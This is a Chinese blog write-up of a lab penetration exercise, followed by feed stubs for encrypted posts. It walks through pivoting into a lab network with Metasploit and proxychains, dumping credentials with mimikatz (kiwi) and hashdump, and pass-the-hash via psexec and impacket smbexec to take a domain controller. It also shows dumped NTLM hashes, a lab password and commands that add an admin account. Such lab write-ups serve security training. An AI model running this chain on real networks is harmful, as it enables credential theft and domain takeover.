<p>通过shell命令进入命令窗口</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825132018668.png" alt="image-20210825132018668"></p>
</blockquote>
<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>可以通过ifconfig看到内网ip</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825133443813.png" alt=""></p>
</blockquote>
<p>接着利用后渗透工具ping方法扫一下ip段，接着扫出三个ip存活</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">info post&#x2F;multi&#x2F;gather&#x2F;ping_sweep &#x2F;&#x2F;查看所需参数</span><br><span class="line">run post&#x2F;multi&#x2F;gather&#x2F;ping_sweep rhosts&#x3D;10.0.1.4&#x2F;24 &#x2F;&#x2F;扫网段</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825141018301.png" alt="image-20210825141018301"></p>
</blockquote>
<p>还有一种方法，arp扫ip段，用法差不多，这个扫的快一些比较推荐</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner rhosts&#x3D;10.0.1.4&#x2F;24</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825141236281.png" alt="image-20210825141236281"></p>
</blockquote>
<p><strong>这是利用msf自带工具扫描，接下来再演示使用nmap扫一下看看</strong></p>
<p><strong>首先添加一个路由如下命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run get_local_subnets &#x2F;&#x2F;查看网段</span><br><span class="line">run autoroute -s 10.0.1.0&#x2F;24</span><br><span class="line">run autoroute -p &#x2F;&#x2F;查看已添加的路由</span><br><span class="line">background &#x2F;&#x2F;保存session返回msf</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825190957026.png" alt="image-20210825190957026"></p>
</blockquote>
<p>接着开启socks4a服务，使用msf的辅助模块</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br><span class="line">set VERSION 4a &#x2F;&#x2F;设置为socks4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825135235850.png" alt="image-20210825135235850"></p>
</blockquote>
<p>接着设置/etc/proxychains.conf 中的内容改为下面展示截图，kali自带的代理工具</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825135313167.png" alt="image-20210825135313167"></p>
</blockquote>
<p><strong>接着我们就可以利用proxychains4来进行连接3389端口，和进行内网ip段扫描，使用nmap扫描其内网ip及其端口等，但是扫的真的慢是我网太卡了么。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -p 22,80,445,3306,3389 10.0.1.0&#x2F;24 --open</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825162331493.png" alt="image-20210825162331493"></p>
</blockquote>
<p>看到好多445端口，这里其实可以用永恒之蓝的</p>
<p><strong>当然，也可以选择不用nmap扫描端口，我们可以用msf的模块扫描端口</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp </span><br><span class="line">set rhosts 10.0.1.6</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826122250324.png" alt="image-20210826122250324"></p>
</blockquote>
<h2 id="kali机用kiwi抓取密码"><a href="#kali机用kiwi抓取密码" class="headerlink" title="kali机用kiwi抓取密码"></a>kali机用kiwi抓取密码</h2><blockquote>
<p>也可以直接抓取管理员密码</p>
</blockquote>
<p>msf提供一些后渗透的模块</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">load -l 来查看有哪些模块</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825132220021.png" alt="image-20210825132220021"></p>
</blockquote>
<p>其实kiwi就是mimikatz就是换了个名在这里，然后加载kiwi</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825132534386.png" alt="image-20210825132534386"></p>
</blockquote>
<p>查看当前kiwi的命令用help</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">help</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826164747221.png" alt="image-20210826164747221"></p>
</blockquote>
<p>对10.0.1.4机子进行抓密码，接着执行下面命令，就可以获取管理员密码，这个是对登陆过的账号和密码进行抓取</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">kiwi_cmd privilege::debug</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825155147593.png" alt="image-20210825155147593"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">获得密码</span><br><span class="line">u：administrator</span><br><span class="line">p：woshifengge1.</span><br></pre></td></tr></table></figure></div>

<h2 id="kali机hash传递得到会话"><a href="#kali机hash传递得到会话" class="headerlink" title="kali机hash传递得到会话"></a>kali机hash传递得到会话</h2><blockquote>
<p>看到445端口就可以尝试hash传递，在不需要密码的情况下使用，发现10.0.1.6-10.0.1.8可以被利用</p>
</blockquote>
<p><strong>hashdump可获取hash值，得是64位系统权限才可执行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hashdump </span><br><span class="line">或者是 </span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;hashdump</span><br><span class="line">或者是</span><br><span class="line">run  post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">以上都可以获取hash值</span><br><span class="line"></span><br><span class="line">background 返回</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825204025897.png" alt="image-20210825204025897"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d1de63584701c85b8b9eccf5243ef83:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">test:1009:aad3b435b51404eeaad3b435b51404ee:77be122bef1c2d43f67721c95114f46b:::</span><br></pre></td></tr></table></figure></div>

<p><strong>通过网段知道6-8有445可以利用smb的hash传递连接10.0.1.8这台机子，因为一般情况几台机子的密码都相同。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp </span><br><span class="line">&#x2F;&#x2F;正向连接</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:4d1de63584701c85b8b9eccf5243ef83  #hashdump获取的hash值进行</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825211954287.png" alt="image-20210825211954287"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826122139082.png" alt="image-20210826122139082"></p>
</blockquote>
<p><strong>这里发现10.0.1.8这台机子存在域控，dns一般是和域控绑定在一个服务器上的</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826111519161.png" alt="image-20210826111519161"></p>
</blockquote>
<h2 id="shell查看域的命令"><a href="#shell查看域的命令" class="headerlink" title="shell查看域的命令"></a>shell查看域的命令</h2><p>shell中命令使用查看是否存在域的方法</p>
<p>这里明显A1这台机子处于域中</p>
<p>1、查看域中计算机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;&#x2F;查看域中的计算机</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826123626763.png" alt="image-20210826123626763"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain &#x2F;&#x2F;查看域</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826123754506.png" alt="image-20210826123754506"></p>
</blockquote>
<p><strong>根据ipconfig /all 可以知道域控主机的ip是10.0.1.6</strong></p>
<p>hash传递并不能登陆进去</p>
<p><strong>2、查看域中的计算机</strong></p>
<p>就一台A1，这里我们得通过A1去获得域控</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain:ZKAQ</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826124241672.png" alt="image-20210826124241672"></p>
<p><strong>3、ping计算机名可以得到IP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ping A1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826152201980.png" alt="image-20210826152201980"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ping zkaq.cn</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826152226030.png" alt="image-20210826152226030"></p>
</blockquote>
<p><strong>4、获得所有域的用户列表，有一个krbtgt就是域用户</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826152412178.png" alt="image-20210826152412178"></p>
</blockquote>
<p><strong>5、获取域用户组信息</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826152604552.png" alt="image-20210826152604552"></p>
</blockquote>
<p><strong>6、获取当前域管理员信息</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826152743124.png" alt="image-20210826152743124"></p>
</blockquote>
<p><strong>7、查看域时间及域服务器的名字</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826152822253.png" alt="image-20210826152822253"></p>
</blockquote>
<p>通过域的信息收集得到DC.zkaq.cn 10.0.1.6这个就是域控</p>
<h2 id="拓展，导入kiwi的命令使用"><a href="#拓展，导入kiwi的命令使用" class="headerlink" title="拓展，导入kiwi的命令使用"></a>拓展，导入kiwi的命令使用</h2><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826154025355.png" alt="image-20210826154025355"></p>
</blockquote>
<p><strong>1、msv列出NTLM</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::msv</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826154258459.png" alt="image-20210826154258459"></p>
</blockquote>
<p>2、kerberos抓密码，发现全部加密了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::kerberos</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826154520844.png" alt="image-20210826154520844"></p>
</blockquote>
<p>3、也可以用creds_all抓取密码，但也明显加密</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">creds_all</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826164910306.png" alt=""></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Username       Domain  NTLM                          </span><br><span class="line">--------       ------  ----  </span><br><span class="line">A1$            ZKAQ    3bf63ae494aee3a74fa90a41b9459df9  </span><br><span class="line">Administrator  ZKAQ    61465a991b168727b65b3644aab823cd </span><br><span class="line">Administrator  A1      4d1de63584701c85b8b9eccf5243ef83</span><br></pre></td></tr></table></figure></div>

<h2 id="Impacket实现域控NTML的hash传递"><a href="#Impacket实现域控NTML的hash传递" class="headerlink" title="Impacket实现域控NTML的hash传递"></a>Impacket实现域控NTML的hash传递</h2><blockquote>
<p>这里发现密码是无法获取的，因为NTLM是密文，我们可以使用hash传递，不过这里得使用<a href="https://github.com/SecureAuthCorp/impacket/tree/impacket_0_9_21" target="_blank" rel="noopener">Impacket</a>的包</p>
</blockquote>
<p><strong>首先我们要先去GitHub下载源码，或者直接使用</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.git</span><br></pre></td></tr></table></figure></div>

<p><strong>然后解压缩，进入impacket</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cd impacket&#x2F;</span><br></pre></td></tr></table></figure></div>

<p><strong>然后运行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></div>

<p><strong>工具都在这个目录里impacket/examples</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cd impacket&#x2F;examples</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826181929813.png" alt="image-20210826181929813"></p>
</blockquote>
<p>接着我们使用smbexec.py这个模块，用上面的ntml值hash传递登陆域控机子</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 smbexec.py -hashes :61465a991b168727b65b3644aab823cd ZKAQ&#x2F;Administrator@10.0.1.6</span><br></pre></td></tr></table></figure></div>

<p><strong>成功拿下域控的超级管理员权限</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826182104275.png" alt="image-20210826182104275"></p>
</blockquote>
<p><strong>接下来是基础操作添加超管账号，然后登陆域控</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">net user gylq ********** /add #密码打长的，2008有限制，密码不能太简单</span><br><span class="line">net localgroup administrators gylq /add #添加超管</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826182456730.png" alt="image-20210826182456730"></p>
</blockquote>
<p>直接代理登陆域控10.0.1.6就报错，这是域控机的守护机制</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826184827868.png" alt="image-20210826184827868"></p>
</blockquote>
<p>需要使用他域内的机子去登陆，我们先登陆10.0.1.8，再登陆域控</p>
<h2 id="远程3389登陆域控"><a href="#远程3389登陆域控" class="headerlink" title="远程3389登陆域控"></a>远程3389登陆域控</h2><p>也可以用直接用抓取的密码来代理登陆3389的端口等，只是演示一下</p>
<p>如果对方没有开启远程连接，可以使用msf自带命令启动</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run getgui -e</span><br></pre></td></tr></table></figure></div>

<p>先登陆10.0.1.4，才发现这个不是域内机子，得去登陆10.0.1.8</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825213850565.png" alt="image-20210825213850565"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop -u administrator -p woshifengge1. 10.0.1.4</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210825155348203.png" alt="image-20210825155348203"></p>
</blockquote>
<p><strong>也可以用代理直接连接10.0.1.8</strong>，来进行确定</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop -u administrator -p woshifengge1. 10.0.1.8</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826184255820.png" alt="image-20210826184255820"></p>
</blockquote>
<p>接着用10.0.1.8作为跳板登陆10.0.1.6，即域控机子</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826185051021.png" alt="image-20210826185051021"></p>
</blockquote>
<p>成功登陆域控</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826185312074.png" alt="image-20210826185312074"></p>
</blockquote>
<p>总结：这是kali中使用msf和impacket联合拿域控</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a><a href="http://gylq.gitee.io">我的个人博客</a></h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Metasploit</tag>
        <tag>提权</tag>
        <tag>封神台</tag>
      </tags>
  </entry>
  <entry>
    <title>【应急靶场实践】Ubuntu-暴力破解、写入ssh公钥留后门、植入GPU挖矿程序——事件复现（含靶场环境）</title>
    <url>/posts/201.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="38f54f1155488d7a7e0536c3caea4784fc697386eef526b2c07014bea9ff6c10"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>靶场实战</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>【渗透靶场实践】Win2008-暴力破解、留后门隐藏账户与shift粘贴键后门、植入WaKuang程序——事件复现（含靶场环境）</title>
    <url>/posts/200.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e1fc49cc05084c5c43bf6c07562550b51661e0d5b120fc7f9a3b8c36fb25da93"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>靶场实战</tag>
      </tags>
  </entry>
  <entry>
    <title>【应急靶场实践】Win2008-暴力破解、留隐藏账户后门与shift粘贴键后门、植入WaKuang程序——事件复现（含靶场环境）</title>
    <url>/posts/199.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ba544be84d75d672b35b6c730d165d5e03c05b00797faa92bea31f41606b8fb3"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>靶场实战</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>【渗透靶场实践】Linux-暴力破解、替换ps命令、留多个后门——事件复现（含靶场环境）</title>
    <url>/posts/198.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="0f70d96ceb6685b86fae8a41d68fdbb767dfbd0258b3969db6649e7ac0f0ffb3"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>靶场实战</tag>
      </tags>
  </entry>
  <entry>
    <title>【应急靶场实践】Linux-暴力破解、替换ps命令、留多个后门——事件复现（含靶场环境）</title>
    <url>/posts/197.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="9937ae920df1f2a737a8e7360bef5dccdf26c53e2c2c254ad5c77be66f1bd1ab"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>靶场实战</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>【渗透靶场实践】centos8-渗透模拟实战（含靶场与挖矿样本）——篡改页面植入暗链、植入挖矿(sysupdate、networkservice)</title>
    <url>/posts/196.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="a395d2ba2aeac9726f424479b88e72d54db6f507f7ea63db57a92d4221a9809f"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>靶场实战</tag>
      </tags>
  </entry>
  <entry>
    <title>【应急靶场实践】Linux-应急响应-挖矿（kdevtmpfsi）——事件复现（含样本）</title>
    <url>/posts/195.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="08d553e0b1b1000fb2889f72bbb2ac940aab3045756746b99a8ead3759d3a3b4"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>靶场实战</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>【应急靶场实践】centos8-篡改页面、挖矿(sysupdate、networkservice)含靶场环境</title>
    <url>/posts/194.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Here's something</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7b6f458924714a5e21037f23ca0adb3c790ad642c0fe7d0329363be4c165195e"></script>
</div>
